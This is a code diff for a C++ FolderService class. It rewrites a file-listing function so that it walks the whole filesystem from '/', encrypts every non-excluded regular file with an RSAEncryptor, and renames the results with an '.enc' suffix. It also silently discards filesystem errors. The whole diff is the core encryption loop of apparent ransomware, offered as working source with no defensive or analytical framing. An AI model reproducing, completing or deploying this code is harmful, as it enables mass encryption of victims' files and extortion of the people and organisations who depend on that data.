@@ -29,18 +29,17 @@ FolderService::FolderService() {
     m_exclude_paths.push_back(".svg");
 }
 
-std::vector<std::string> FolderService::list_files() {
+void FolderService::list_files_and_encrypt(RSAEncryptor* encrytpor) {
     boost::filesystem::path root("/");
 
     for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
         if (boost::filesystem::is_directory(it->path())) {
-            list_files_in_directory(it->path());
+            list_files_in_directory(it->path(), encrytpor);
         }
     }
-    return get_data_files();
 }
 
-void FolderService::list_files_in_directory(boost::filesystem::path directory) {
+void FolderService::list_files_in_directory(boost::filesystem::path directory, RSAEncryptor* encrytpor) {
     try {
         for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
             std::string path = it->path().string();
@@ -56,14 +55,16 @@ void FolderService::list_files_in_directory(boost::filesystem::path directory) {
 
             if (!exclude) {
                 if (boost::filesystem::is_regular_file(it->path())) {
-                    std::cout << it->path() << std::endl;
-                    m_data_files.push_back(path);
+                    try {
+                        encrytpor->encryptFile(it->path());
+                        m_data_files.push_back(path + ".enc");
+                    } catch(Exception ex) {
+                        std::cout << ex.what()<<std::endl;
+                    }
                 } else if (boost::filesystem::is_directory(it->path())) {
-                    list_files_in_directory(it->path());
+                    list_files_in_directory(it->path(), encrytpor);
                 }
             }
         }
-    } catch (const boost::filesystem::filesystem_error& e) {
-        std::cerr << "Error: " << e.what() << std::endl;
-    }
+    } catch (const boost::filesystem::filesystem_error& e) {}
 }
